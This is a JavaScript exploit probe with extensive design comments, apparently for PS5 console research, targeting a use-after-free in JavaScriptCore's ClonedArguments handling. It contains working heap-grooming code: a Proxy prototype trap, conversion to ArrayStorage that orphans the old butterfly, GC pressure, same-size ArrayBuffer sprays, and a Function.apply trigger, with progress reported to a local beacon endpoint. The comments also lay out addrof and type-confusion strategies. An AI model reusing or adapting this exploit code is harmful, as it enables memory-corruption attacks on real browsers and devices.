// p244 - ClonedArguments UAF: addrof via object argument leak
// Strategy: put JS OBJECTS as arguments to ClonedArguments.
// After UAF, the stale data[] contains JSValue-encoded pointers
// to those objects. Read them via Float64Array to extract raw bits.
//
// The copyToArguments loop writes JSValues to firstElementDest.
// If we can read those JSValues as raw bits (via ArrayBuffer/DataView),
// we get the actual heap addresses of the objects.
//
// Trigger: func.apply(null, args) where args has objects and a hole
// The Proxy trap fires on the hole, we get the stale reads.
// The stale values include JSValue pointers to our objects.
//
// Key insight: even without spray reclaim, the ORIGINAL argument
// values are in the stale data. If those arguments are objects,
// their JSValue encoding contains the raw heap pointer.
// When copyToArguments writes these to firstElementDest (the call
// frame buffer), then the called function receives them as
// normal JS values. We can then use DataView to inspect their bits.
//
// BUT: the values are normal JS values, not raw bits. To get raw bits
// we need a second primitive. HOWEVER: if we use arguments that are
// doubles (not integers), JSC stores them as raw IEEE 754 in the
// butterfly's contiguous double storage. Reading them back gives
// the same doubles. Nothing leaked.
//
// REVISED STRATEGY: Use the stale vectorLength to read BEYOND
// the original butterfly allocation. After growing the butterfly in
// the Proxy trap, the new butterfly is larger. But vectorLength
// was captured from the OLD butterfly. If the OLD butterfly's
// IndexingHeader is overwritten (e.g. by a spray), the stale
// vectorLength could be huge, causing an OOB read.
//
// Actually: vectorLength is read at line 290 BEFORE the loop.
// So it's the original vectorLength. Not useful.
//
// FINAL STRATEGY: Use the UAF to create a type confusion.
// 1. Create ClonedArguments with contiguous doubles (all args are doubles)
// 2. Proxy trap converts to ArrayStorage
// 3. After trap, loop continues reading data[i].get() from OLD butterfly
// 4. The OLD butterfly stored doubles. Now interpret them as JSValues.
// BUT: contiguous doubles are stored differently than contiguous JSValues.
// With ALL_DOUBLE_INDEXING_TYPES, the butterfly stores raw IEEE 754.
// With ALL_CONTIGUOUS_INDEXING_TYPES, it stores NaN-boxed JSValues.
//
// ClonedArguments always uses Contiguous (not Double) indexing for
// mixed argument types. So if all args are ints, they're NaN-boxed ints.
// If any arg is an object, they're NaN-boxed pointers.
//
// The key is: after trap converts to ArrayStorage, copyToArguments
// still uses the case ALL_CONTIGUOUS_INDEXING_TYPES code path
// because the switch was already taken. The stale data[] still
// has NaN-boxed JSValues. These are the original argument pointers.
// copyToArguments writes them to firstElementDest as JSValues.
// The called function (receiver) gets these as normal JS values.
// No type confusion occurs - the values are valid JSValues.
//
// We need SPRAY RECLAIM to make data[] point to our controlled bytes.
// Focus probe: high-volume GC pressure in Proxy trap.
//
// Beacon prefix: V244-

(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var url = '/beacon/V244-' + tag + '?t=' + Date.now();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(String(body).substring(0, 900));
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch(e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  // Test: create objects, pass as arguments, read back via DataView
  // to verify we can extract pointer bits from JSValues
  var targetObj = {marker: 0xDEAD};
  var targetArr = [1,2,3];
  var targetFunc = function() { return 42; };

  // Phase 1: Verify that we can extract bits from double arguments
  try {
    var buf = new ArrayBuffer(8);
    var f64 = new Float64Array(buf);
    var u32 = new Uint32Array(buf);

    // In JSC NaN-boxing on 64-bit:
    // - Integer N: bits = 0xFFFE000000000000 | N (N is int32)
    // - Double D: bits = IEEE754(D) (if not NaN)
    // - Object P: bits = P (pointer, tagged depending on platform)
    //
    // On PS5 (64-bit), object pointers are stored raw.
    // We can't directly read pointer bits from JS.
    //
    // But if we put a DOUBLE as argument, the butterfly stores
    // its IEEE754 bits. If we can confuse types...

    f64[0] = 1.1;
    B('DOUBLE-BITS-' + hex(u32[1]) + hex(u32[0]));
    // 1.1 = 0x3FF199999999999A
  } catch(e) {
    B('BIT-ERR-' + e.message.substring(0, 30));
  }

  // Phase 2: Aggressive UAF with maximum GC pressure
  // Use WeakRef + FinalizationRegistry to detect when butterfly is freed
  var freed = false;
  var registry = typeof FinalizationRegistry !== 'undefined'
    ? new FinalizationRegistry(function() { freed = true; })
    : null;

  try {
    B('UAF2-START');

    function uafVictim2() {
      // Use 16 arguments for larger butterfly
      delete arguments[2];

      var self = arguments;
      var trapCount = 0;
      var uafSpray = [];

      Object.setPrototypeOf(arguments, new Proxy({}, {
        get: function(t, prop) {
          trapCount++;
          if (trapCount === 1 && prop === '2') {
            B('UAF2-TRAP-' + prop);

            // Step 1: Convert to ArrayStorage (orphans old butterfly)
            self[0x7fffffff] = 1;
            delete self[0x7fffffff];

            // Step 2: Allocate and FREE many same-size objects
            // This fills the bmalloc dealloc log and pushes freed
            // objects through to the size-class free list
            var ALLOC_SIZE = 104; // butterfly size for 8 args
            var tempBufs = [];
            for (var i = 0; i < 5000; i++) {
              tempBufs.push(new ArrayBuffer(ALLOC_SIZE));
            }
            B('UAF2-ALLOC-' + tempBufs.length);
            // Free them all to push through dealloc log
            tempBufs = null;

            // Step 3: GC pressure to process dealloc log
            for (var g = 0; g < 20; g++) {
              var j = [];
              for (var k = 0; k < 10000; k++) j.push({x: k});
              j = null;
            }
            B('UAF2-GC');

            // Step 4: Now spray replacement into freed slots
            // The old butterfly should now be in the free list
            for (var s = 0; s < 3000; s++) {
              var ab = new ArrayBuffer(ALLOC_SIZE);
              var v = new Uint32Array(ab);
              // Write JSValue-encoded integer pattern
              // Target: data[0] through data[7] (after outOfLine + header)
              // In the allocation, data starts at byte 40:
              // outOfLine: 4 * 8 = 32 bytes (before butterfly pointer)
              // IndexingHeader: 8 bytes
              // = 40 bytes header, then contiguous data
              // In Uint32 terms: index 10 onward
              // Each JSValue = 2 Uint32s (lo, hi in little-endian)
              for (var k = 0; k < v.length; k += 2) {
                v[k] = 0xCAFE0000 | (k/2);   // lo32
                v[k+1] = 0xFFFE0000;           // hi32 (int tag)
              }
              uafSpray.push(ab);
            }
            B('UAF2-SPRAY-' + uafSpray.length);
          }
          return 0xBEEF;
        }
      }));

      // Trigger copyToArguments
      var r = [];
      for (var i = 0; i < arguments.length; i++) r.push(arguments[i]);
      return r;
    }

    // NOTE: Array.prototype.slice.call and Function.apply both go
    // through loadVarargs -> copyToArguments for ClonedArguments.
    // But simple for-loop access goes through regular get().
    // We need .apply to trigger the vulnerable code path.
    function recv() { return Array.prototype.slice.call(arguments); }

    var result = recv.apply(null, uafVictim2(
      0xAAAA0001, 0xAAAA0002, 0xAAAA0003,
      0xAAAA0004, 0xAAAA0005, 0xAAAA0006,
      0xAAAA0007, 0xAAAA0008, 0xAAAA0009,
      0xAAAA000A, 0xAAAA000B, 0xAAAA000C,
      0xAAAA000D, 0xAAAA000E, 0xAAAA000F,
      0xAAAA0010
    ));

    // Wait: uafVictim2 returns an array, not ClonedArguments.
    // We need to pass ClonedArguments directly to apply.
    // Fix: have uafVictim2 return `arguments` and pass THAT to apply.
    B('UAF2-WRONG-PATH');

  } catch(e) {
    B('UAF2-ERR-' + e.message.substring(0, 60));
  }

  // Phase 3: Correct trigger path
  // The ClonedArguments must be the second arg to Function.apply
  try {
    B('UAF3-START');

    var uafSpray3 = [];

    function mkClonedArgs() {
      delete arguments[2];

      var self = arguments;
      var hitTrap = false;

      Object.setPrototypeOf(arguments, new Proxy({}, {
        get: function(t, prop) {
          if (!hitTrap && prop === '2') {
            hitTrap = true;
            B('UAF3-TRAP');

            // Convert to ArrayStorage
            self[0x7fffffff] = 1;
            delete self[0x7fffffff];

            // Exhaust bmalloc dealloc log
            var temp = [];
            for (var i = 0; i < 8000; i++) {
              temp.push(new ArrayBuffer(104));
            }
            // Free
            for (var i = 0; i < temp.length; i++) temp[i] = null;
            temp = null;

            // Heavy GC
            for (var g = 0; g < 30; g++) {
              var j = new Array(20000);
              for (var k = 0; k < j.length; k++) j[k] = {x: k};
              j = null;
            }

            // Spray exact size
            for (var s = 0; s < 5000; s++) {
              var ab = new ArrayBuffer(104);
              var v = new Uint32Array(ab);
              for (var k = 0; k < v.length; k += 2) {
                v[k] = 0xCAFE0000 | (k/2);
                v[k+1] = 0xFFFE0000;
              }
              uafSpray3.push(ab);
            }
            B('UAF3-SPRAY-' + uafSpray3.length);
          }
          return 0xBEEF;
        }
      }));

      // Return ClonedArguments directly
      return arguments;
    }

    var cloned = mkClonedArgs(
      0xBBBB0001, 0xBBBB0002, 0xBBBB0003,
      0xBBBB0004, 0xBBBB0005, 0xBBBB0006,
      0xBBBB0007, 0xBBBB0008
    );

    B('UAF3-CLONED-LEN-' + cloned.length);

    // Now use .apply to trigger copyToArguments
    function collector() {
      return Array.prototype.slice.call(arguments);
    }

    var result3 = collector.apply(null, cloned);
    B('UAF3-RESULT-LEN-' + result3.length);

    var vals = [];
    var cafeHits = 0;
    for (var i = 0; i < result3.length; i++) {
      var v = result3[i];
      var u = (typeof v === 'number') ? (v >>> 0) : 0;
      vals.push(i + '=' + hex(u));
      if ((u >>> 16) === 0xCAFE) cafeHits++;
    }
    B('UAF3-VALS', vals.join(' '));
    B('UAF3-CAFE-' + cafeHits);

    if (cafeHits > 0) {
      B('UAF3-RECLAIM-HIT');
    } else {
      // Check if values differ from original
      var diffCount = 0;
      for (var i = 0; i < result3.length; i++) {
        if (i === 2) continue; // hole, gets Proxy return
        var expected = 0xBBBB0001 + i;
        if (result3[i] !== expected) {
          diffCount++;
          B('UAF3-DIFF-' + i + '-got-' + hex(result3[i] >>> 0) + '-exp-' + hex(expected));
        }
      }
      if (diffCount === 0) {
        B('UAF3-NO-RECLAIM-ORIGINAL-VALUES');
      }
    }
  } catch(e) {
    B('UAF3-ERR-' + e.message.substring(0, 60));
  }

  B('DONE');
})();
